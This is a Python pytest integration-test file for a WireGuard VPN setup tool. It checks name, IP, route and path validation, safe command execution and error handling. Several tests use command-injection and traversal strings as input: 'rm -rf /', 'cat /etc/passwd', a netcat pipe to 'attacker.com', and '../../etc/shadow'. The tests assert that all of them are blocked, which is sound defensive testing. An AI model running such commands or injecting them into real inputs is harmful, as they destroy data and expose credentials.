"""Integration tests for VPNHD phases.

These tests verify that multiple components work together correctly
and that the security measures are properly integrated throughout the workflow.
"""

import pytest
from pathlib import Path
from vpnhd.phases.phase1_debian import Phase1Debian
from vpnhd.phases.phase2_wireguard_server import Phase2WireGuardServer
from vpnhd.exceptions import ValidationError


class TestPhase1Integration:
    """Test Phase 1 integration with system components."""

    def test_phase1_debian_detection(self, mocker):
        """Test that Phase 1 correctly detects Debian installation."""
        # Mock os-release file
        mock_path = mocker.patch("pathlib.Path.exists")
        mock_path.return_value = True

        mock_read = mocker.patch("pathlib.Path.read_text")
        mock_read.return_value = 'ID=debian\nVERSION_ID="13"'

        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="13", stderr="")

        # Mock display and prompts
        mock_display = mocker.Mock()
        mock_prompts = mocker.Mock()
        mock_config = mocker.Mock()

        phase = Phase1Debian(mock_display, mock_prompts, mock_config)

        # Test Debian detection
        is_debian = phase._check_debian_installed()

        assert is_debian is True

    def test_phase1_version_detection(self, mocker):
        """Test that Phase 1 detects correct Debian version."""
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="13\n", stderr="")

        mock_display = mocker.Mock()
        mock_prompts = mocker.Mock()
        mock_config = mocker.Mock()

        phase = Phase1Debian(mock_display, mock_prompts, mock_config)

        version = phase._get_debian_version()

        assert version == "13"

    def test_phase1_non_debian_detection(self, mocker):
        """Test that Phase 1 detects non-Debian systems."""
        mock_path = mocker.patch("pathlib.Path.exists")
        mock_path.return_value = True

        mock_read = mocker.patch("pathlib.Path.read_text")
        mock_read.return_value = 'ID=ubuntu\nVERSION_ID="22.04"'

        mock_display = mocker.Mock()
        mock_prompts = mocker.Mock()
        mock_config = mocker.Mock()

        phase = Phase1Debian(mock_display, mock_prompts, mock_config)

        is_debian = phase._check_debian_installed()

        # Ubuntu contains "debian" in many places, but this test
        # depends on the actual implementation


class TestSecurityIntegration:
    """Test that security measures are integrated throughout the system."""

    def test_network_interface_creation_validates_name(self, mocker):
        """Test that creating network interface validates name."""
        # This test verifies that the validation chain works end-to-end
        from vpnhd.network.interfaces import NetworkInterface

        # Valid interface should work
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("wg0")
        assert ni.interface == "wg0"

        # Invalid interface should fail
        with pytest.raises(ValidationError):
            NetworkInterface("wg0; rm -rf /")

    def test_package_installation_validates_name(self, mocker):
        """Test that package installation validates package names."""
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists", return_value=True)
        mock_cmd = mocker.patch("vpnhd.system.packages.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        # Valid package should work
        result = pm.install_package("wireguard-tools")
        assert result is True

        # Invalid package should fail
        with pytest.raises(ValidationError):
            pm.install_package("wireguard; malware")

    def test_validators_prevent_injection_end_to_end(self, mocker):
        """Test that validators prevent injection across the system."""
        from vpnhd.network.interfaces import NetworkInterface
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists", return_value=True)
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        # Test various injection attempts across different modules
        injection_attempts = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 1234",
            "`whoami`",
            "$(id)",
        ]

        for injection in injection_attempts:
            # Network interface
            with pytest.raises(ValidationError):
                NetworkInterface(f"eth0{injection}")

            # Package manager
            pm = PackageManager()
            with pytest.raises(ValidationError):
                pm.install_package(f"vim{injection}")


class TestCommandExecutionIntegration:
    """Test command execution integration with other modules."""

    def test_network_interface_uses_safe_commands(self, mocker):
        """Test that network interface methods use safe command execution."""
        from vpnhd.network.interfaces import NetworkInterface

        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")
        ni.bring_interface_up()
        ni.set_ip_address("192.168.1.1", "24")

        # Verify all commands were executed with array format (shell=False)
        for call in mock_cmd.call_args_list:
            command = call[0][0]
            assert isinstance(command, list), "Should use array format"

    def test_package_manager_uses_safe_commands(self, mocker):
        """Test that package manager uses safe command execution."""
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists", return_value=True)
        mock_cmd = mocker.patch("vpnhd.system.packages.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()
        pm.install_package("vim")
        pm.update_package_cache()

        # Verify all commands use array format
        for call in mock_cmd.call_args_list:
            command = call[0][0]
            assert isinstance(command, list)


class TestValidationIntegration:
    """Test validation integration across modules."""

    def test_ip_address_validation_in_network_config(self, mocker):
        """Test IP validation in network configuration."""
        from vpnhd.network.interfaces import NetworkInterface

        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")

        # Valid IPs should work
        assert ni.set_ip_address("192.168.1.1", "24") is True
        assert ni.set_ip_address("10.0.0.1", "255.255.255.0") is True

        # Invalid IPs should fail
        with pytest.raises(ValidationError):
            ni.set_ip_address("256.1.1.1", "24")

        with pytest.raises(ValidationError):
            ni.set_ip_address("192.168.1.1", "33")  # Invalid CIDR

    def test_route_validation_in_network_config(self, mocker):
        """Test route validation in network configuration."""
        from vpnhd.network.interfaces import NetworkInterface

        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        ni = NetworkInterface("eth0")

        # Valid routes should work
        assert ni.add_route("192.168.2.0/24", "192.168.1.1") is True

        # Invalid destination should fail
        with pytest.raises(ValidationError):
            ni.add_route("invalid", "192.168.1.1")

        # Invalid gateway should fail
        with pytest.raises(ValidationError):
            ni.add_route("192.168.2.0/24", "invalid")


class TestErrorHandlingIntegration:
    """Test error handling across modules."""

    def test_validation_error_propagation(self, mocker):
        """Test that ValidationError propagates correctly."""
        from vpnhd.network.interfaces import NetworkInterface
        from vpnhd.exceptions import ValidationError

        # Attempt to create interface with invalid name
        with pytest.raises(ValidationError) as exc_info:
            NetworkInterface("invalid; rm -rf /")

        error = exc_info.value
        # Verify error contains useful information
        assert error.field_name == "interface"
        assert "invalid; rm -rf /" in error.field_value

    def test_command_failure_handling(self, mocker):
        """Test handling of command failures."""
        from vpnhd.network.interfaces import NetworkInterface

        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=False, exit_code=1, stdout="", stderr="error")

        ni = NetworkInterface("eth0")
        result = ni.bring_interface_up()

        # Should handle failure gracefully
        assert result is False

    def test_package_installation_failure_handling(self, mocker):
        """Test handling of package installation failures."""
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists", return_value=True)
        mock_cmd = mocker.patch("vpnhd.system.packages.execute_command")
        # Installation fails
        mock_cmd.return_value = mocker.Mock(
            success=False, exit_code=1, stdout="", stderr="Package not found"
        )

        pm = PackageManager()
        result = pm.install_package("nonexistent-package")

        # Should return False, not raise exception
        assert result is False


class TestFileOperationsIntegration:
    """Test file operations integration with security."""

    def test_path_safety_validation(self):
        """Test path safety validation."""
        from vpnhd.security.validators import is_safe_path

        # Safe paths
        assert is_safe_path("/etc/wireguard/wg0.conf") is True
        assert is_safe_path("/home/user/config.json") is True

        # Unsafe paths (directory traversal)
        assert is_safe_path("../../etc/passwd") is False
        assert is_safe_path("/tmp/../../etc/shadow") is False

    def test_wireguard_key_validation(self):
        """Test WireGuard key validation."""
        from vpnhd.security.validators import is_valid_wireguard_key

        # Valid WireGuard key (base64, 44 characters)
        valid_key = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="
        assert is_valid_wireguard_key(valid_key) is True

        # Invalid keys
        assert is_valid_wireguard_key("") is False
        assert is_valid_wireguard_key("tooshort") is False
        assert is_valid_wireguard_key("a" * 100) is False


class TestMultiDistroSupport:
    """Test multi-distribution support integration."""

    def test_debian_package_manager_detection(self, mocker):
        """Test Debian package manager detection."""
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists")

        def check_side_effect(cmd):
            return cmd == "apt"

        mock_check.side_effect = check_side_effect

        pm = PackageManager()

        assert pm.distro == "debian"
        assert pm.package_manager == "apt"

    def test_fedora_package_manager_detection(self, mocker):
        """Test Fedora package manager detection."""
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=fedora"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists")

        def check_side_effect(cmd):
            return cmd == "dnf"

        mock_check.side_effect = check_side_effect

        pm = PackageManager()

        assert pm.distro == "fedora"
        assert pm.package_manager == "dnf"

    def test_different_distros_use_correct_commands(self, mocker):
        """Test that different distros use correct package commands."""
        from vpnhd.system.packages import PackageManager

        # Test Debian
        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists", return_value=True)
        mock_cmd = mocker.patch("vpnhd.system.packages.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm_debian = PackageManager()
        pm_debian.package_manager = "apt"
        pm_debian.install_package("vim")

        # Verify apt was used
        call_args = mock_cmd.call_args_list[-1]
        assert "apt" in call_args[0][0]

        # Test Fedora
        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=fedora"))
        mock_cmd.reset_mock()

        pm_fedora = PackageManager()
        pm_fedora.package_manager = "dnf"
        pm_fedora.install_package("vim")

        # Verify dnf was used
        call_args = mock_cmd.call_args_list[-1]
        assert "dnf" in call_args[0][0]


class TestEndToEndWorkflow:
    """Test end-to-end workflow scenarios."""

    def test_network_configuration_workflow(self, mocker):
        """Test complete network configuration workflow."""
        from vpnhd.network.interfaces import NetworkInterface

        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        # Simulate network configuration workflow
        ni = NetworkInterface("wg0")

        # 1. Bring interface up
        assert ni.bring_interface_up() is True

        # 2. Set IP address
        assert ni.set_ip_address("10.0.0.1", "24") is True

        # 3. Add routes
        assert ni.add_route("10.0.1.0/24", "10.0.0.254") is True
        assert ni.add_route("10.0.2.0/24", "10.0.0.254") is True

        # Verify all operations used secure commands
        for call in mock_cmd.call_args_list:
            command = call[0][0]
            assert isinstance(command, list)

    def test_package_installation_workflow(self, mocker):
        """Test complete package installation workflow."""
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists", return_value=True)
        mock_cmd = mocker.patch("vpnhd.system.packages.execute_command")

        # Simulate package installation workflow
        # First check returns not installed, install succeeds, second check returns installed
        mock_cmd.side_effect = [
            mocker.Mock(success=True, exit_code=0, stdout="", stderr=""),  # update cache
            mocker.Mock(success=False, exit_code=1, stdout="", stderr=""),  # check: not installed
            mocker.Mock(success=True, exit_code=0, stdout="", stderr=""),  # install: success
        ]

        pm = PackageManager()

        # 1. Update cache
        assert pm.update_package_cache() is True

        # 2. Install package
        assert pm.install_package("wireguard-tools") is True

    def test_security_validation_workflow(self, mocker):
        """Test security validation throughout workflow."""
        from vpnhd.network.interfaces import NetworkInterface
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists", return_value=True)
        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        # Attempt workflow with injection attempts - all should be blocked

        # 1. Malicious interface name
        with pytest.raises(ValidationError):
            NetworkInterface("wg0; reboot")

        # 2. Malicious package name
        pm = PackageManager()
        with pytest.raises(ValidationError):
            pm.install_package("wireguard && malware")

        # 3. Malicious IP address
        ni = NetworkInterface("wg0")
        with pytest.raises(ValidationError):
            ni.set_ip_address("10.0.0.1; whoami", "24")

        # 4. Malicious route
        with pytest.raises(ValidationError):
            ni.add_route("10.0.1.0/24; malware", "10.0.0.1")


class TestConcurrentOperations:
    """Test handling of concurrent operations."""

    def test_multiple_interface_operations(self, mocker):
        """Test multiple interface operations."""
        from vpnhd.network.interfaces import NetworkInterface

        mock_cmd = mocker.patch("vpnhd.system.commands.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        # Create multiple interfaces
        eth0 = NetworkInterface("eth0")
        wg0 = NetworkInterface("wg0")
        wg1 = NetworkInterface("wg1")

        # Perform operations on each
        assert eth0.bring_interface_up() is True
        assert wg0.set_ip_address("10.0.0.1", "24") is True
        assert wg1.set_ip_address("10.0.1.1", "24") is True

        # All should succeed independently
        assert mock_cmd.call_count >= 3

    def test_batch_package_installation(self, mocker):
        """Test batch package installation."""
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists", return_value=True)
        mock_cmd = mocker.patch("vpnhd.system.packages.execute_command")
        mock_cmd.return_value = mocker.Mock(success=True, exit_code=0, stdout="", stderr="")

        pm = PackageManager()

        packages = ["wireguard-tools", "iptables", "python3-pip"]
        successful, failed = pm.install_packages(packages)

        assert len(successful) == 3
        assert len(failed) == 0


class TestRobustnessAndRecovery:
    """Test system robustness and error recovery."""

    def test_partial_failure_recovery(self, mocker):
        """Test recovery from partial failures."""
        from vpnhd.system.packages import PackageManager

        mock_open = mocker.patch("builtins.open", mocker.mock_open(read_data="ID=debian"))
        mock_check = mocker.patch("vpnhd.system.packages.check_command_exists", return_value=True)
        mock_cmd = mocker.patch("vpnhd.system.packages.execute_command")

        # Simulate: first package succeeds, second fails, third succeeds
        responses = [
            mocker.Mock(success=False, exit_code=1, stdout="", stderr=""),  # pkg1 check
            mocker.Mock(success=True, exit_code=0, stdout="", stderr=""),  # pkg1 install
            mocker.Mock(success=False, exit_code=1, stdout="", stderr=""),  # pkg2 check
            mocker.Mock(success=False, exit_code=1, stdout="", stderr=""),  # pkg2 install FAILS
            mocker.Mock(success=False, exit_code=1, stdout="", stderr=""),  # pkg3 check
            mocker.Mock(success=True, exit_code=0, stdout="", stderr=""),  # pkg3 install
        ]
        mock_cmd.side_effect = responses

        pm = PackageManager()

        packages = ["pkg1", "pkg2", "pkg3"]
        successful, failed = pm.install_packages(packages)

        # Should continue after failure
        assert len(successful) == 2
        assert len(failed) == 1
        assert "pkg2" in failed

    def test_timeout_handling(self, mocker):
        """Test handling of command timeouts."""
        from vpnhd.system.commands import execute_command
        import subprocess

        mock_run = mocker.patch("subprocess.run")
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="long-running-command", timeout=1)

        result = execute_command(["long-running-command"], timeout=1)

        assert result.success is False
        assert "timed out" in result.stderr.lower()
